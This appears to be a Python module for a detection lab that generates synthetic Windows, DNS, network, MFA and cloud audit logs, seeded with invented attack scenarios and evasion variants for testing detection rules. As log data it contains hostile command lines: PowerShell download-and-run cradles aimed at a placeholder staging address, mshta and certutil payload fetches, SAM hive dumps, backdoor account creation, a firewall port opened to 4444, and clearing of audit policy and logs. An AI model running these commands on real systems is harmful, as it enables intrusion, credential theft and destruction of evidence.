"""Version 5 additions to the synthetic generator.

What this adds on top of the original generator:

* more kinds of log events (registry, files, services, scheduled tasks, DNS, network flows, PowerShell
  script text, directory reads, MFA prompts, cloud audit calls), all in the shared schema (schema.py);
* ordinary background activity for those log types, so a rule has to stay quiet in the middle of normal traffic;
* one harmless but rule-triggering "benign twin" for every documented exclusion, so the before/after tuning
  numbers exercise each exclusion;
* seven more attack stories (SC-07 .. SC-13);
* nine more red-team variants (EV-07 .. EV-15).

Everything uses its own random generator, seeded from the same seed. The original generator is not touched by
it, so the events it produced before still exist unchanged (only their ids shift, because ids are numbered after
sorting by time, and logins gain a network provider field).

Everything here is invented. Addresses come from the RFC 5737 documentation ranges, names are made up, and
no payload does anything.
"""

from __future__ import annotations

import base64
import random
from datetime import timedelta

HOME_ASNS = ["AS64496", "AS64497", "AS64498", "AS64499"]       # four consumer internet providers
SERVERS = ["SRV-FILE-01", "SRV-IAM-01", "SRV-PATCH-01", "SRV-REPO-01", "SRV-LOG-01", "SRV-APP-01",
           "SRV-DB-01", "SRV-WEB-01", "DC-01", "BACKUP-01"]
BROWSE_IPS = [f"192.0.2.{n}" for n in range(101, 141)]         # ordinary websites
PATCH_VENDOR_IP = "192.0.2.200"
BACKUP_PROVIDER_IP = "192.0.2.180"
C2_IP = "203.0.113.50"
STAGE_IP = "203.0.113.60"
EXFIL_IP = "203.0.113.88"
CLOUD_ATTACKER_IP = "203.0.113.131"
CI_RUNNER_IP = "10.0.9.20"
SCANNER_IP = "10.0.5.50"

ADMIN = {"name": "adm.rossi", "ip": "198.51.100.5", "host": "WS-ADM-01", "country": "US"}
DEV = {"name": "dev.ops", "ip": "198.51.100.7", "host": "WS-DEV-01", "country": "US"}

BROWSE_NAMES = ["www.example.com", "mail.example.com", "cdn.example.net", "login.example.org", "api.example.com",
                "static.example.net", "chat.example.org", "docs.example.com", "news.example.net",
                "maps.example.org", "files.example.com", "wiki.example.org", "video.example.net"]

SCENARIOS_V5 = {
    "SC-07": {
        "name": "Full intrusion: phishing to domain credential theft",
        "description": ("An administrator opens a Word file. Hidden PowerShell downloads a second stage, sets up two "
                        "kinds of persistence, bypasses UAC, dumps LSASS and the SAM hive, clears the Security log, "
                        "starts a service on the file server, runs a command over WMI, and finally copies the "
                        "domain password database (DCSync)."),
        "expected_rules": ["DET-004", "DET-021", "DET-014", "DET-013", "DET-007", "DET-015", "DET-009", "DET-010",
                           "DET-017", "DET-012", "DET-020", "DET-011"],
    },
    "SC-08": {
        "name": "Cloud account takeover through MFA fatigue",
        "description": ("Nine MFA prompts are refused or ignored for the cloud engineer, then one is approved. The "
                        "attacker signs in from a new network provider, creates an access key without MFA, and "
                        "stops CloudTrail logging."),
        "expected_rules": ["DET-025", "DET-027", "DET-030", "DET-029"],
    },
    "SC-09": {
        "name": "Hands-on-keyboard toolkit with a backdoor account",
        "description": ("On one workstation the attacker runs mshta and certutil downloads, creates a local admin "
                        "account, opens a firewall port, saves the SAM hive, then wipes the audit policy and the "
                        "Security log."),
        "expected_rules": ["DET-016", "DET-019", "DET-006", "DET-018", "DET-010", "DET-017"],
    },
    "SC-10": {
        "name": "Beaconing implant on an application server",
        "description": ("rundll32.exe on SRV-APP-01 calls an outside address about every 60 seconds for three hours "
                        "(8 percent timing jitter)."),
        "expected_rules": ["DET-022"],
    },
    "SC-11": {
        "name": "Bulk exfiltration from the file server",
        "description": "3 GiB leave SRV-FILE-01 for one outside address in 40 minutes, late at night.",
        "expected_rules": ["DET-023"],
    },
    "SC-12": {
        "name": "DNS tunnel from a workstation",
        "description": ("About 300 TXT lookups of random-looking names under one outside domain in 25 minutes, "
                        "asked by powershell.exe."),
        "expected_rules": ["DET-024"],
    },
    "SC-13": {
        "name": "Network sweep with a stolen service account",
        "description": ("The patch service account signs in over the network to 14 computers in under 4 minutes "
                        "and starts a PowerShell remoting session on six of them."),
        "expected_rules": ["DET-026", "DET-032"],
    },
}

EVASION_V5 = {
    "EV-07": {
        "name": "Beacon with heavy timing jitter",
        "description": ("The implant on SRV-DB-01 still calls out about every minute, but each wait is a random "
                        "30 to 90 seconds instead of 60 plus or minus 8 percent."),
        "expected_rules": ["DET-022"],
        "mitigation": ("The rule only accepts gaps that vary by less than 15 percent. Raising that limit also lets "
                       "ordinary traffic through, so it needs a second signal (a destination no other host ever "
                       "contacts, or a program that has no business making outside connections). Not fixed."),
    },
    "EV-08": {
        "name": "Slow exfiltration",
        "description": ("40 MiB per hour to one outside address for five days (4.7 GiB in total), so no single hour "
                        "reaches 1 GiB."),
        "expected_rules": ["DET-023"],
        "mitigation": ("Add a 24 hour rule with a threshold near 2 GiB per destination, then measure how much noise "
                       "it adds from backups before shipping it. Not fixed."),
    },
    "EV-09": {
        "name": "Low-rate DNS tunnel",
        "description": "One lookup of a new random name every 20 seconds for two hours, so only 30 names per 10 minutes.",
        "expected_rules": ["DET-024"],
        "mitigation": ("Add a longer window plus a measure of how random the left-most label looks (entropy), or "
                       "watch for one domain that is only ever asked TXT questions. Not fixed."),
    },
    "EV-10": {
        "name": "Persistence through the Startup folder",
        "description": "A shortcut is written into the user's Startup folder instead of a Run registry key.",
        "expected_rules": ["DET-031"],
        "mitigation": ("DET-014 only watches the Run keys, so it could not see this. DET-031 was written after "
                       "this test and now covers the Startup folders."),
    },
    "EV-11": {
        "name": "PsExec with a renamed service",
        "description": ("PsExec started with its rename option, so the service is called svcupd and the program "
                        "is %SystemRoot%\\svcupd.exe instead of PSEXESVC."),
        "expected_rules": ["DET-012"],
        "mitigation": ("DET-012 looks for known tool names and risky paths, and a plain name under SystemRoot "
                       "looks normal. It needs the file creation that comes first (a program written over the "
                       "network into ADMIN$) joined to the service install. Not fixed."),
    },
    "EV-12": {
        "name": "Renamed copy of a signed Windows tool",
        "description": "mshta.exe copied to C:\\Users\\Public\\ms.exe and run against a remote HTA page.",
        "expected_rules": ["DET-016"],
        "mitigation": ("The tool rules match the name stored inside the program file (original_name) as well as "
                       "the file name, so a copy with a new name is still caught."),
    },
    "EV-13": {
        "name": "Backdoor account named like the help desk names accounts",
        "description": ("Using the help desk admin's login on the domain controller, the attacker creates an "
                        "account called z.contractor, which fits the onboarding naming pattern."),
        "expected_rules": ["DET-019"],
        "mitigation": ("This is the price of the documented exclusion. It stays narrow (one admin, one host, one "
                       "naming pattern) but it cannot tell a real new hire from a lookalike. A ticket check or a "
                       "daily review of new accounts would close it. Not fixed."),
    },
    "EV-14": {
        "name": "Allowed installer address hidden in a comment",
        "description": ("On the help desk workstation, a download-and-run script has the Chocolatey installer "
                        "address added as a comment, which is what the exclusion looks for."),
        "expected_rules": ["DET-021"],
        "mitigation": ("Fixed in v5. The first version of the exclusion matched the address as plain text anywhere "
                       "in the script. It now matches only the whole documented one-line installer."),
    },
    "EV-15": {
        "name": "Slow MFA fatigue",
        "description": ("Six prompts are refused 35 minutes apart, then one is approved, so no 30 minute window "
                        "contains more than a couple of failures."),
        "expected_rules": ["DET-025"],
        "mitigation": ("Add a rule over a longer window (for example 3 failures in 4 hours then an approval from a "
                       "new address). Not fixed."),
    },
}


def asn_for(ip: str) -> str:
    """The network provider (ASN) an address belongs to, using the documentation AS numbers."""
    if ip.startswith("10."):
        return "AS-PRIVATE"
    if ip == "192.0.2.77":
        return "AS64510"         # the corporate VPN exit
    if ip == "192.0.2.150":
        return "AS64505"         # the traveller's hotel network
    if ip == "198.51.100.250":
        return "AS64540"         # a hosting provider inside the same country (EV-05)
    if ip.startswith("198.51.100."):
        return HOME_ASNS[int(ip.rsplit(".", 1)[1]) % 4]
    if ip.startswith("203.0.113."):
        return f"AS{64530 + int(ip.rsplit('.', 1)[1]) % 8}"
    return "AS64550"


def _enc_ps(command: str) -> str:
    return base64.b64encode(command.encode("utf-16-le")).decode("ascii")


def add_v5(ctx: dict) -> None:
    """Append every version 5 event to ``ctx['raw']`` through ``ctx['emit']``."""
    emit, at = ctx["emit"], ctx["at"]
    raw, users, by_name = ctx["raw"], ctx["users"], ctx["by_name"]
    days, evasion = ctx["days"], ctx["evasion"]
    rng = random.Random(f"detlab-v5:{ctx['seed']}")

    def sec(n):
        return timedelta(seconds=n)

    # ------------------------------------------------------------------ event writers
    def login(t, user, ip, country, outcome, service, sc=None):
        emit(t, sc, category="authentication", action="login", source="idp", outcome=outcome, user=user,
             src_ip=ip, country=country, service=service, host="auth-gw", asn=asn_for(ip))

    def mfa(t, user, outcome, ip, country, sc=None):
        emit(t, sc, category="authentication", action="mfa_prompt", source="idp", outcome=outcome, method="push",
             user=user, src_ip=ip, country=country, host="auth-gw")

    def hostlogon(t, user, host, src_ip, outcome="success", ltype=3, sc=None):
        emit(t, sc, category="authentication", action="host_logon", source="security", outcome=outcome,
             logon_type=ltype, user=user, host=host, src_ip=src_ip)

    def proc(t, user, host, name, parent, cmd, sc=None, **extra):
        emit(t, sc, category="process", action="process_create", source="sysmon", user=user, host=host,
             process_name=name, parent_process=parent, command_line=cmd, **extra)

    def access(t, user, host, name, target, mask, sc=None):
        emit(t, sc, category="process", action="process_access", source="sysmon", user=user, host=host,
             process_name=name, target_process=target, granted_access=mask)

    def regset(t, user, host, name, key, value, sc=None):
        emit(t, sc, category="registry", action="registry_set", source="sysmon", user=user, host=host,
             process_name=name, registry_key=key, registry_value=value)

    def filec(t, user, host, name, path, sc=None):
        emit(t, sc, category="file", action="file_create", source="sysmon", user=user, host=host,
             process_name=name, file_path=path)

    def task(t, user, host, name, cmd, sc=None):
        emit(t, sc, category="persistence", action="scheduled_task_create", source="security", user=user,
             host=host, task_name=name, task_command=cmd)

    def service(t, user, host, name, path, sc=None):
        emit(t, sc, category="persistence", action="service_install", source="system", user=user, host=host,
             service_name=name, service_path=path, service_account="LocalSystem")

    def logclear(t, user, host, log, sc=None):
        emit(t, sc, category="defense", action="log_clear", source="security", user=user, host=host, log_name=log)

    def newuser(t, actor, host, target, sc=None):
        emit(t, sc, category="iam", action="user_create", source="security", user=actor, host=host,
             target_user=target)

    def dirread(t, user, host, props, sc=None):
        emit(t, sc, category="directory", action="directory_access", source="security", user=user, host=host,
             object_type="domainDNS", properties=props, access_mask="0x100")

    def sblock(t, user, host, text, sc=None):
        emit(t, sc, category="script", action="powershell_scriptblock", source="powershell", user=user,
             host=host, script_text=text)

    def net(t, user, host, name, src_ip, dst_ip, port, scope, out, inn, sc=None):
        emit(t, sc, category="network", action="network_connect", source="sysmon", user=user, host=host,
             process_name=name, src_ip=src_ip, dst_ip=dst_ip, dst_port=port, dst_scope=scope, protocol="tcp",
             bytes_out=out, bytes_in=inn)

    def dns(t, user, host, name, query, domain, qtype="A", sc=None):
        emit(t, sc, category="dns", action="dns_query", source="sysmon", user=user, host=host,
             process_name=name, query=query, domain=domain, query_type=qtype)

    def cloud(t, user, event, src, ip, country, mfa_used, outcome="success", target=None, resource=None, sc=None):
        fields = dict(category="cloud", action="cloud_audit", source="cloudtrail", user=user, host="aws-main",
                      event_name=event, event_source=src, outcome=outcome, src_ip=ip, country=country,
                      mfa_used=mfa_used)
        if target:
            fields["target_user"] = target
        if resource:
            fields["resource"] = resource
        emit(t, sc, **fields)

    # ------------------------------------------- 1. touch up the events the original generator wrote
    # Every login gets a network provider, every ordinary cloud sign-in gets its MFA approval, and every event
    # that had no source gets one.
    source_for = {"login": "idp", "process_create": "sysmon", "group_add": "security"}
    for row in list(raw):
        row.setdefault("source", source_for.get(row.get("action"), "unknown"))
        if row.get("action") == "login":
            row["asn"] = asn_for(row["src_ip"])
            if row["_sc"] is None and row["outcome"] == "success" and row["service"] == "o365":
                mfa(row["_t"] - sec(12), row["user"], "approved", row["src_ip"], row["country"])

    people = users + [ADMIN, DEV]

    # ------------------------------------------------------------ 2. ordinary background activity
    for day in range(days):
        weekday = at(day).weekday() < 5
        for u in people:
            if not weekday and rng.random() > 0.1:
                continue
            # the morning sign-in to the person's own computer (and the odd typo)
            t = at(day, 8) + sec(rng.randint(0, 5400))
            ok = rng.random() > 0.04
            hostlogon(t, u["name"], u["host"], u["ip"], "success" if ok else "failure", 2)
            if not ok:
                hostlogon(t + sec(20), u["name"], u["host"], u["ip"], "success", 2)
            # opening shares on the file server
            for _ in range(rng.choice([1, 1, 2])):
                hostlogon(at(day, 9) + sec(rng.randint(0, 28800)), u["name"], "SRV-FILE-01", u["ip"], "success", 3)
            # web and mail traffic
            for _ in range(6):
                name = rng.choice(["chrome.exe", "chrome.exe", "msedge.exe", "outlook.exe", "teams.exe"])
                net(at(day, 8) + sec(rng.randint(0, 36000)), u["name"], u["host"], name, u["ip"],
                    rng.choice(BROWSE_IPS), rng.choice([443, 443, 443, 80]), "external",
                    rng.randint(400, 60000), rng.randint(2000, 2_500_000))
            # name lookups (a few names under each domain, never dozens)
            for _ in range(8):
                q = rng.choice(BROWSE_NAMES)
                dns(at(day, 8) + sec(rng.randint(0, 36000)), u["name"], u["host"],
                    rng.choice(["chrome.exe", "msedge.exe", "outlook.exe"]), q, q.split(".", 1)[1])
        if weekday:
            # the two extra identities also sign in to the cloud every working morning
            for p in (ADMIN, DEV):
                t = at(day, 9) + sec(rng.randint(0, 1800))
                mfa(t - sec(12), p["name"], "approved", p["ip"], "US")
                login(t, p["name"], p["ip"], "US", "success", "o365")
            # the security agent only asks to query LSASS (a low access mask, which does not match DET-009)
            for h in ("DC-01", "SRV-FILE-01", "SRV-IAM-01"):
                access(at(day, 6) + sec(rng.randint(0, 40000)), "SYSTEM", h, "MsMpEng.exe", "lsass.exe", "0x1000")
            # the cloud engineer's ordinary read-only calls, with MFA
            for _ in range(3):
                cloud(at(day, 9) + sec(rng.randint(1800, 30000)), DEV["name"],
                      rng.choice(["DescribeInstances", "ListBuckets", "DescribeTrails", "GetObject"]),
                      "ec2.amazonaws.com", DEV["ip"], "US", True)

    # ordinary admin commands that look like the dangerous ones but only read (they must not alert)
    for day, cmd, name in [
        (1, "schtasks /query /fo LIST", "schtasks.exe"),
        (2, "netsh advfirewall show allprofiles", "netsh.exe"),
        (4, "wevtutil qe Security /c:5 /f:text", "wevtutil.exe"),
        (5, "auditpol /get /category:*", "auditpol.exe"),
        (6, "net user", "net.exe"),
        (8, "schtasks /query /tn Backup", "schtasks.exe"),
        (9, "netsh interface ip show config", "netsh.exe"),
        (11, "wevtutil el", "wevtutil.exe"),
    ]:
        proc(at(day, 10, 15) + sec(rng.randint(0, 3000)), "it.admin", "WS-001", name, "cmd.exe", cmd)
    sblock(at(2, 11), "it.admin", "WS-001", "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5")
    sblock(at(5, 11), "it.admin", "WS-001",
           "$x=[Convert]::FromBase64String($cfg.Cert); Set-Content cert.cer -Value $x -Encoding Byte")
    sblock(at(7, 11), "it.admin", "WS-001",
           "Invoke-WebRequest -Uri https://example.org/tool.zip -OutFile C:\\Temp\\tool.zip")

    # ----------------------------------------- 3. a harmless twin for every documented exclusion
    # Each of these makes its rule fire when the exclusion is switched off (the "before tuning" numbers).
    for day in (2, 9):                                                      # DET-013, DET-016
        for h in ("WS-020", "WS-021", "WS-022"):
            t = at(day, 7, 30) + sec(rng.randint(0, 600))
            task(t, "svc_updater", h, "\\GoogleUpdateTaskMachineCore",
                 "C:\\Users\\svc_updater\\AppData\\Local\\Google\\Update\\GoogleUpdate.exe /c")
            task(t + sec(1), "svc_updater", h, "\\GoogleUpdateTaskMachineUA",
                 "C:\\Users\\svc_updater\\AppData\\Local\\Google\\Update\\GoogleUpdate.exe /ua /installsource scheduler")
        proc(at(day, 7, 45), "svc_updater", "SRV-REPO-01", "bitsadmin.exe", "svchost.exe",
             "bitsadmin /transfer upd /download http://repo.corp.example/pkg.msi C:\\Windows\\Temp\\pkg.msi")
    for i, day in enumerate((1, 2, 3, 4, 5, 6)):                            # DET-014
        u = users[8 + i]
        regset(at(day, 9) + sec(rng.randint(0, 3000)), u["name"], u["host"], "Teams.exe",
               f"HKU\\S-1-5-21-1004336348-1177238915-682003330-{1200 + i}\\Software\\Microsoft\\Windows"
               "\\CurrentVersion\\Run\\com.squirrel.Teams.Teams",
               f"\"C:\\Users\\{u['name']}\\AppData\\Local\\Microsoft\\Teams\\Update.exe\" --processStart \"Teams.exe\"")
    for day in (6, 13):                                                     # DET-017
        t = at(day, 4, 0)
        proc(t, "svc_logrotate", "SRV-LOG-01", "wevtutil.exe", "powershell.exe",
             "wevtutil epl Application D:\\logs\\application.evtx")
        proc(t + sec(30), "svc_logrotate", "SRV-LOG-01", "wevtutil.exe", "powershell.exe", "wevtutil cl Application")
        logclear(t + sec(31), "svc_logrotate", "SRV-LOG-01", "Application")
    proc(at(4, 13, 10), "it.admin", "SRV-FILE-01", "netsh.exe", "cmd.exe",       # DET-018
         'netsh advfirewall firewall add rule name="Monitoring Agent" dir=in action=allow protocol=TCP localport=9100')
    for day, who in ((1, "n.valdez"), (8, "p.okoye"), (8, "h.tanaka")):     # DET-019
        newuser(at(day, 10, 30) + sec(rng.randint(0, 1200)), "it.admin", "DC-01", who)
    for day in (4, 11):                                                     # DET-020
        t = at(day, 4, 0)
        proc(t, "svc_monitor", "SRV-FILE-01", "cmd.exe", "wmiprvse.exe", "cmd.exe /c hostname")
        proc(t + sec(1), "svc_monitor", "SRV-FILE-01", "cmd.exe", "wmiprvse.exe", "cmd.exe /c ipconfig")
        proc(t + sec(2), "svc_monitor", "SRV-FILE-01", "cmd.exe", "wmiprvse.exe", "cmd.exe /c ping -n 1 SRV-DB-01")
    sblock(at(3, 14), "it.admin", "WS-001",                                  # DET-021
           "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = "
           "3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))")
    for day in (4, 11):                                                     # DET-022
        for h in ("WS-020", "WS-021", "WS-022"):
            u = next(x for x in users if x["host"] == h)
            for k in range(36):
                net(at(day, 8) + sec(k * 300 + rng.randint(-2, 2)), "svc_updater", h, "patchagent.exe", u["ip"],
                    PATCH_VENDOR_IP, 443, "external", 800, 1500)
    for day in range(days):                                                 # DET-023
        for k in range(4):
            net(at(day, 3, 20) + sec(k * 600), "svc_backup", "BACKUP-01", "backupagent.exe", "10.0.8.10",
                BACKUP_PROVIDER_IP, 443, "external", 5 * 1024 ** 3, 40_000)
    for day in (4, 9):                                                      # DET-024
        u = next(x for x in users if x["host"] == "WS-023")
        for k in range(150):
            h = f"{rng.getrandbits(48):012x}"
            dns(at(day, 11) + sec(k * 2), u["name"], "WS-023", "avagent.exe", f"{h}.rep.avcloud.example",
                "avcloud.example")
    for day in (5, 11):                                                     # DET-026
        for k, h in enumerate(SERVERS):
            hostlogon(at(day, 2, 30) + sec(k * 17), "svc_scan", h, SCANNER_IP, "success", 3)
    for day in (4, 11):                                                     # DET-032
        proc(at(day, 13, 30), "it.admin", "SRV-APP-01", "wsmprovhost.exe", "svchost.exe",
             "C:\\Windows\\system32\\wsmprovhost.exe -Embedding")
    for day in (3, 10):                                                     # DET-030
        cloud(at(day, 6), "svc_ci", "CreateAccessKey", "iam.amazonaws.com", CI_RUNNER_IP, "US", False,
              target="svc_ci")
    for day, h in ((5, "WS-024"), (5, "WS-025")):                           # DET-031
        filec(at(day, 9, 5), "SYSTEM", h, "msiexec.exe",
              "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\ScannerTray.lnk")

    # ------------------------------------------------------------------ 4. attack scenarios
    # SC-07: an administrator opens a Word file (day 9, Saturday morning)
    a, ah = ADMIN["name"], ADMIN["host"]
    sid = "HKU\\S-1-5-21-1004336348-1177238915-682003330-1105"
    t0 = at(9, 9, 40)
    stage = _enc_ps("Write-Output 'detlab-sample-sc07'")
    proc(t0, a, ah, "powershell.exe", "winword.exe", f"powershell.exe -nop -w hidden -enc {stage}", "SC-07")
    sblock(t0 + sec(4), a, ah,
           f"IEX (New-Object Net.WebClient).DownloadString('http://{STAGE_IP}/stage2.ps1')", "SC-07")
    regset(t0 + sec(35), a, ah, "powershell.exe", f"{sid}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
           f"powershell.exe -nop -w hidden -enc {stage}", "SC-07")
    proc(t0 + sec(50), a, ah, "schtasks.exe", "powershell.exe",
         'schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR "powershell.exe -nop -w hidden -c IEX"', "SC-07")
    proc(t0 + sec(120), a, ah, "whoami.exe", "powershell.exe", "whoami.exe /all", "SC-07")
    proc(t0 + sec(135), a, ah, "net.exe", "powershell.exe", 'net.exe group "Domain Admins" /domain', "SC-07")
    regset(t0 + sec(240), a, ah, "powershell.exe", f"{sid}\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)",
           f"powershell.exe -nop -w 1 -enc {stage}", "SC-07")
    access(t0 + sec(420), a, ah, "powershell.exe", "lsass.exe", "0x1410", "SC-07")
    proc(t0 + sec(540), a, ah, "reg.exe", "cmd.exe", "reg save HKLM\\SAM C:\\Windows\\Temp\\s.save", "SC-07")
    logclear(t0 + sec(720), a, ah, "Security", "SC-07")
    service(t0 + sec(1200), a, "SRV-FILE-01", "PSEXESVC", "%SystemRoot%\\PSEXESVC.exe", "SC-07")
    proc(t0 + sec(1260), a, "SRV-FILE-01", "cmd.exe", "wmiprvse.exe",
         "cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1.out 2>&1", "SC-07")
    dirread(t0 + sec(1800), a, "DC-01",
            "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}\n{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}", "SC-07")

    # SC-08: MFA fatigue, then a cloud takeover (day 10, Sunday, 02:10)
    d = DEV["name"]
    t0 = at(10, 2, 10)
    for k in range(9):
        mfa(t0 + sec(k * 80), d, "timeout" if k < 6 else "denied", CLOUD_ATTACKER_IP, "RO", "SC-08")
    mfa(t0 + sec(13 * 60), d, "approved", CLOUD_ATTACKER_IP, "RO", "SC-08")
    login(t0 + sec(13 * 60 + 30), d, CLOUD_ATTACKER_IP, "RO", "success", "o365", "SC-08")
    cloud(t0 + sec(20 * 60), d, "CreateAccessKey", "iam.amazonaws.com", CLOUD_ATTACKER_IP, "RO", False,
          target="svc_deploy", sc="SC-08")
    cloud(t0 + sec(31 * 60), d, "StopLogging", "cloudtrail.amazonaws.com", CLOUD_ATTACKER_IP, "RO", False,
          resource="main-trail", sc="SC-08")

    # SC-09: tools, a backdoor account, a firewall hole and a log wipe on one workstation (day 11)
    v = users[25]
    t0 = at(11, 14, 0)
    proc(t0, v["name"], v["host"], "mshta.exe", "explorer.exe", f"mshta.exe http://{STAGE_IP}/a.hta", "SC-09")
    proc(t0 + sec(40), v["name"], v["host"], "certutil.exe", "cmd.exe",
         f"certutil -urlcache -split -f http://{STAGE_IP}/t.exe C:\\Users\\Public\\t.exe", "SC-09")
    proc(t0 + sec(90), v["name"], v["host"], "net.exe", "cmd.exe", "net user support Passw0rd! /add", "SC-09")
    emit(t0 + sec(100), "SC-09", category="iam", action="group_add", source="security", user=v["name"],
         target_user="support", group="Administrators", host=v["host"])
    proc(t0 + sec(150), v["name"], v["host"], "netsh.exe", "cmd.exe",
         'netsh advfirewall firewall add rule name="Updater" dir=in action=allow protocol=TCP localport=4444', "SC-09")
    proc(t0 + sec(200), v["name"], v["host"], "reg.exe", "cmd.exe",
         "reg save HKLM\\SAM C:\\Users\\Public\\sam.save", "SC-09")
    proc(t0 + sec(260), v["name"], v["host"], "auditpol.exe", "cmd.exe", "auditpol /clear /y", "SC-09")
    proc(t0 + sec(280), v["name"], v["host"], "wevtutil.exe", "cmd.exe", "wevtutil cl Security", "SC-09")
    logclear(t0 + sec(281), v["name"], v["host"], "Security", "SC-09")

    # SC-10: a beacon with 8 percent jitter for three hours (day 7)
    t = at(7, 8, 0)
    for _ in range(180):
        net(t, "svc_app", "SRV-APP-01", "rundll32.exe", "10.0.3.15", C2_IP, 443, "external",
            rng.randint(380, 460), rng.randint(280, 340), "SC-10")
        t += sec(60 * (1 + rng.uniform(-0.08, 0.08)))

    # SC-11: 3 GiB to one outside address in 40 minutes (day 10, 23:10)
    for k in range(24):
        net(at(10, 23, 10) + sec(k * 100), "svc_sync", "SRV-FILE-01", "rclone.exe", "10.0.3.20", EXFIL_IP, 443,
            "external", 128 * 1024 ** 2, 5000, "SC-11")

    # SC-12: a DNS tunnel (day 8, 16:00)
    w = users[30]
    for k in range(300):
        label = "".join(rng.choice("abcdefghijklmnopqrstuvwxyz234567") for _ in range(32))
        dns(at(8, 16, 0) + sec(k * 5), w["name"], w["host"], "powershell.exe", f"{label}.t.example-c2.net",
            "example-c2.net", "TXT", "SC-12")

    # SC-13: a stolen service account signs in to 14 computers (day 12, 11:20)
    s = users[5]
    hosts13 = SERVERS + [users[i]["host"] for i in (10, 11, 12, 13)]
    for k, h in enumerate(hosts13):
        hostlogon(at(12, 11, 20) + sec(k * 16), "svc_patch", h, s["ip"], "success", 3, "SC-13")
        if k < 6:                                       # the attacker starts a PowerShell remoting session on six
            proc(at(12, 11, 20) + sec(k * 16 + 4), "svc_patch", h, "wsmprovhost.exe", "svchost.exe",
                 "C:\\Windows\\system32\\wsmprovhost.exe -Embedding", "SC-13")

    # ------------------------------------------------------------ 5. red-team variants
    if evasion:
        # EV-07: random 30 to 90 second gaps instead of a steady rhythm. The gap pattern repeats a fixed 12-step
        # list, so every window of 12 or more gaps has the same wide spread and the result does not depend on luck.
        gaps = [30, 85, 50, 90, 40, 70, 35, 80, 60, 45, 75, 55]
        t = at(8, 8, 0)
        for k in range(180):
            net(t, "svc_app", "SRV-DB-01", "svchost.exe", "10.0.3.30", C2_IP, 443, "external",
                rng.randint(380, 460), rng.randint(280, 340), "EV-07")
            t += sec(gaps[k % len(gaps)])
        # EV-08: 40 MiB every hour for five days
        for k in range(5 * 24):
            net(at(3, 0) + timedelta(hours=k), "svc_sync", "SRV-FILE-01", "rclone.exe", "10.0.3.20",
                "203.0.113.89", 443, "external", 40 * 1024 ** 2, 5000, "EV-08")
        # EV-09: a new random name every 20 seconds for two hours
        w = users[31]
        for k in range(360):
            label = "".join(rng.choice("abcdefghijklmnopqrstuvwxyz234567") for _ in range(32))
            dns(at(9, 20, 0) + sec(k * 20), w["name"], w["host"], "powershell.exe", f"{label}.slow.example-c2.net",
                "example-c2.net", "TXT", "EV-09")
        # EV-10: a shortcut in the Startup folder
        u = users[27]
        filec(at(11, 10, 40), u["name"], u["host"], "powershell.exe",
              f"C:\\Users\\{u['name']}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Updater.lnk",
              "EV-10")
        # EV-11: PsExec with a renamed service
        service(at(12, 13, 0), "adm.rossi", "SRV-APP-01", "svcupd", "%SystemRoot%\\svcupd.exe", "EV-11")
        # EV-12: a renamed copy of mshta.exe
        u = users[26]
        proc(at(12, 14, 0), u["name"], u["host"], "ms.exe", "cmd.exe",
             f"C:\\Users\\Public\\ms.exe http://{STAGE_IP}/a.hta", "EV-12", original_name="MSHTA.EXE")
        # EV-13: an account named like the help desk names them, made with the help desk login
        newuser(at(12, 15, 0), "it.admin", "DC-01", "z.contractor", "EV-13")
        # EV-14: the allowed installer address added as a comment
        sblock(at(12, 16, 0), "it.admin", "WS-001",
               "# https://community.chocolatey.org/install.ps1\n"
               f"IEX (New-Object Net.WebClient).DownloadString('http://{STAGE_IP}/x.ps1')", "EV-14")
        # EV-15: six refused prompts 35 minutes apart, then an approval
        u = users[28]
        for k in range(6):
            mfa(at(10, 12, 0) + timedelta(minutes=35 * k), u["name"], "denied", "203.0.113.141", "UA", "EV-15")
        mfa(at(10, 12, 0) + timedelta(minutes=35 * 6), u["name"], "approved", "203.0.113.141", "UA", "EV-15")
        # EV-06 (written for the first version) also leaves its decoded script in the script block log
        lee = by_name["k.lee"]
        sblock(at(12, 14, 30) + sec(3), "k.lee", lee["host"],
               f"IEX (New-Object Net.WebClient).DownloadString('http://{STAGE_IP}/ev06.ps1')", "EV-06")
